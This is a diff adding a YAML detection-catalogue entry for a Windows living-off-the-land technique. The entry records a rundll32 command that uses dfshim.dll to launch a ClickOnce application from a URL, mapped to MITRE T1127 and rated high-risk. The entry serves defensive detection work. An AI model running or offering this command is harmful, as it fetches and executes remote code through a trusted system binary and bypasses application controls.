@@ -1,0 +1,19 @@
+- command: rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo
+  description: Abusing rundll32 with dfsvc library dfshim.dll to launch a click-once-application from a given URL.
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Execution:
+      - T1127
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Dfsvc/
+  risk: High
+  risk_reason: This type of commandline is extremely rare for most organizations and should be treated as highly suspicious.
+  fidelity: High
+  fidelity_reason: This type of commandline activity is typically very abnormal for most organizations.
+  tool: Dfsvc
+  threatactors:
+    N/A:
+      - N/A
